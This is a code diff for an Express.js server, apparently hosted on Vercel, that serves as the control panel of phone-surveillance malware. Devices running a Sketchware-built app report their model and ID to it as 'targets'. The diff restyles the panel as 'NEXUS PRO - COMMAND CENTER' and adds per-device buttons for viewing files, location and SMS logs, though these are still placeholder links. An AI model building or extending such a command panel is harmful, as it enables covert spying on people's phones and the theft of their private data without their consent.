@@ -4,108 +4,84 @@ const app = express();
 
 app.use(express.json());
 
-// Temporary storage path for Vercel environments
 const DATA_FILE = '/tmp/targets.json';
 
-// Function to read and filter data
 const readData = () => {
     if (!fs.existsSync(DATA_FILE)) return [];
     try {
         let data = JSON.parse(fs.readFileSync(DATA_FILE));
-        // Filter out data older than 24 hours
         const now = Date.now();
         const oneDay = 24 * 60 * 60 * 1000;
         return data.filter(t => (now - new Date(t.timestamp).getTime()) < oneDay);
-    } catch (e) { 
-        return []; 
-    }
+    } catch (e) { return []; }
 };
 
-// Function to write data to the temporary file
 const saveData = (data) => {
     fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
 };
 
-// 1. API Endpoint: Receives data from Sketchware Pro
+// API to receive data from Sketchware
 app.post('/api', (req, res) => {
     const { model, id } = req.body;
     let targets = readData();
-    
-    // Add new target with timestamp for the 24-hour logic
     targets.push({ 
         model, 
         id, 
         timestamp: new Date().toISOString(),
         lastSeen: new Date().toLocaleString() 
     });
-    
     saveData(targets);
     res.json({ status: "success", data: { model, id } });
 });
 
-// 2. Export Feature: Generates a CSV/Text report for download
-app.get('/download', (req, res) => {
-    const targets = readData();
-    let content = "MODEL, DEVICE ID, CAPTURE TIME\n";
-    targets.forEach(t => {
-        content += `${t.model}, ${t.id}, ${t.lastSeen}\n`;
-    });
-    
-    res.setHeader('Content-Type', 'text/csv');
-    res.setHeader('Content-Disposition', 'attachment; filename=nexus_pro_report.csv');
-    res.status(200).send(content);
-});
-
-// 3. Web Dashboard UI
+// Main Dashboard UI with Buttons
 app.get('/', (req, res) => {
     const targets = readData();
     res.send(`
         <!DOCTYPE html>
         <html>
         <head>
-            <title>NEXUS PRO Dashboard</title>
+            <title>NEXUS PRO - COMMAND CENTER</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
+            <style>
+                body { background:#0f0f0f; color:#e0e0e0; font-family: sans-serif; padding:10px; }
+                .card { background:#1a1a1a; border:1px solid #333; border-radius:12px; padding:15px; margin-bottom:15px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
+                .status-btn { background:#00e676; color:black; border:none; padding:8px 15px; border-radius:5px; font-weight:bold; cursor:pointer; margin:5px; text-decoration:none; display:inline-block; }
+                .action-btn { background:#2196F3; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer; margin:5px; text-decoration:none; display:inline-block; font-size:12px; }
+                .header { color:#00e676; text-align:center; border-bottom: 2px solid #333; padding-bottom:10px; }
+            </style>
         </head>
-        <body style="background:#121212; color:#ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding:20px;">
-            <div style="max-width:800px; margin:auto; border:1px solid #333; padding:30px; border-radius:15px; background:#1e1e1e; box-shadow: 0 4px 15px rgba(0,0,0,0.5);">
-                <h1 style="color:#00e676; margin-bottom:5px;">NEXUS PRO</h1>
-                <p style="color:#888; margin-top:0;">Live Monitoring Console (24H Data Retention)</p>
-                
-                <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
-                
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <div>
-                        <h3 style="margin-bottom:0;">Online Targets</h3>
-                        <span style="font-size:48px; font-weight:bold; color:#00e676;">${targets.length}</span>
-                    </div>
-                    <a href="/download" style="background:#2196F3; color:white; padding:12px 24px; text-shadow:none; text-decoration:none; border-radius:8px; font-weight:bold; transition: 0.3s;">
-                        DOWNLOAD REPORT
-                    </a>
-                </div>
-
-                <div style="margin-top:30px;">
-                    <h4 style="color:#aaa; text-transform:uppercase; letter-spacing:1px;">Recent Activity</h4>
-                    <ul style="list-style:none; padding:0; margin-top:15px;">
-                        ${targets.length === 0 ? '<li style="color:#555;">No active targets found within the last 24 hours.</li>' : ''}
-                        ${targets.reverse().map(t => `
-                            <li style="background:#252525; margin-bottom:12px; padding:15px; border-radius:8px; border-left:5px solid #00e676; display:flex; justify-content:space-between; align-items:center;">
-                                <div>
-                                    <strong style="font-size:1.1em;">${t.model}</strong><br>
-                                    <code style="color:#00e676; font-size:0.9em;">ID: ${t.id}</code>
-                                </div>
-                                <div style="text-align:right;">
-                                    <small style="color:#888; display:block;">Captured At</small>
-                                    <small style="color:#bbb;">${t.lastSeen}</small>
-                                </div>
-                            </li>
-                        `).join('')}
-                    </ul>
-                </div>
+        <body>
+            <h1 class="header">NEXUS PRO v2.0</h1>
+            <p style="text-align:center;">Targets Active: <b>${targets.length}</b></p>
+            
+            <div style="text-align:center;">
+                <a href="/download" class="status-btn">DOWNLOAD FULL LOGS</a>
             </div>
-            <p style="text-align:center; color:#444; font-size:12px; margin-top:20px;">Automated Cleanup Active: Data older than 24 hours is permanently deleted.</p>
+
+            <h3 style="margin-top:20px;">Connected Devices:</h3>
+            ${targets.length === 0 ? '<p style="color:#666;">Waiting for connection...</p>' : ''}
+            
+            ${targets.reverse().map(t => `
+                <div class="card">
+                    <div style="display:flex; justify-content:space-between;">
+                        <b>📱 ${t.model}</b>
+                        <small style="color:#00e676;">Online</small>
+                    </div>
+                    <code style="display:block; margin:10px 0; color:#888;">ID: ${t.id}</code>
+                    <hr style="border:0.1px solid #333;">
+                    <div style="margin-top:10px;">
+                        <a href="#" class="action-btn">📂 VIEW FILES</a>
+                        <a href="#" class="action-btn" style="background:#f44336;">📍 LOCATION</a>
+                        <a href="#" class="action-btn" style="background:#FF9800;">💬 SMS LOGS</a>
+                    </div>
+                    <small style="display:block; margin-top:10px; color:#555;">Last Activity: ${t.lastSeen}</small>
+                </div>
+            `).join('')}
         </body>
         </html>
     `);
 });
 
 module.exports = app;
+            
